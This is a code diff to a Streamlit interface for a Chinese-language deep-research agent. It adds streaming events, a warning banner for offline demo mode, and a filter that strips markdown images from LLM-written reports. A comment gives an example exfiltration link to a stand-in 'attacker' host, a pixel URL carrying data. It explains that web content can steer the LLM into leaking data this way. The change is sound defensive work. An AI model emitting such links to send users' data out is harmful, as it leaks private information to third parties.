@@ -19,6 +19,7 @@ from __future__ import annotations
 import json
 import os
 import queue
+import re
 import sys
 import threading
 from pathlib import Path
@@ -32,12 +33,17 @@ from app.contracts import (  # noqa: E402
     EVENT_DONE,
     EVENT_ERROR,
     EVENT_REPORT_DELTA,
+    EVENT_REPORT_RESET,
+    EVENT_RESEARCH_STARTED,
     AgentEvent,
 )
 from app.graph.build import run_research  # noqa: E402
 
 UI_MODE = os.getenv("UI_MODE", "gateway")  # gateway | inline
 GATEWAY_URL = os.getenv("GATEWAY_URL", "http://127.0.0.1:8000").rstrip("/")
+
+# 报告渲染前剥 markdown 图片：`![alt](url)` 与 HTML img 一律屏蔽
+_IMG_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
 
 st.set_page_config(page_title="研知 · Deep Research Agent", page_icon="🔬", layout="wide")
 
@@ -96,6 +102,7 @@ for key, default in {
     "report_text": "",
     "done": False,
     "error": None,
+    "mode": "",
     "events": [],
     "citation": None,
 }.items():
@@ -116,6 +123,7 @@ if st.button("开始研究", type="primary", disabled=running or not question.st
     st.session_state.report_text = ""
     st.session_state.done = False
     st.session_state.error = None
+    st.session_state.mode = ""
     st.session_state.events = []
     st.session_state.citation = None
     # UI_MODE 决定数据源：gateway=SSE 客户端（主路径），inline=进程内直调（砍线兜底）。
@@ -130,6 +138,7 @@ if st.button("开始研究", type="primary", disabled=running or not question.st
 
 st.divider()
 status_ph = st.empty()
+mode_ph = st.empty()
 report_ph = st.empty()
 side_ph = st.container()
 
@@ -147,9 +156,16 @@ def live_panel() -> None:
             break
         if event.type == EVENT_REPORT_DELTA:
             st.session_state.report_text += str(event.payload.get("text", ""))
+        elif event.type == EVENT_REPORT_RESET:
+            # 流式断流降级的清场信号：残文不清，降级全文就会拼在半截后面
+            st.session_state.report_text = ""
+            st.session_state.events.append(event)
         elif event.type == EVENT_DONE:
             st.session_state.done = True
             st.session_state.citation = event.payload.get("citation_report")
+        elif event.type == EVENT_RESEARCH_STARTED:
+            st.session_state.mode = str(event.payload.get("provider_mode", ""))
+            st.session_state.events.append(event)
         elif event.type == EVENT_ERROR:
             # 后台线程崩掉时这是唯一能到达 UI 的失败信号（评审 P0-3）；
             # 同时进 events 列表，让过程面板里也能看到错误现场
@@ -171,6 +187,15 @@ def live_panel() -> None:
     else:
         status_ph.info("输入问题，点「开始研究」")
 
+    # fake 模式的证据长得跟真的一样（example.com 除外），不讲明来源，
+    # 现场演示忘切配置就会拿固定台词当真数据（评审 P2-10）
+    if st.session_state.mode == "fake":
+        mode_ph.warning(
+            "🧪 离线演示模式（PROVIDER_MODE=fake）：以下证据与报告基于固定示例数据，非真实检索"
+        )
+    else:
+        mode_ph.empty()
+
     with side_ph:
         with st.expander("⚙️ 研究过程事件（实时）", expanded=not st.session_state.done):
             for event in st.session_state.events[-25:]:
@@ -185,7 +210,9 @@ def live_panel() -> None:
 
     if st.session_state.report_text:
         tail = " ▌" if alive and not st.session_state.done else ""
-        report_ph.markdown(st.session_state.report_text + tail)
+        # 剥外链图片语法再渲染：报告由不可信网页喂出来的 LLM 生成，
+        # 一张 ![](http://attacker/pixel?data=...) 就是现成的数据外泄通道（评审 P2-13）
+        report_ph.markdown(_IMG_RE.sub("[图片已屏蔽]", st.session_state.report_text) + tail)
 
 
 live_panel()
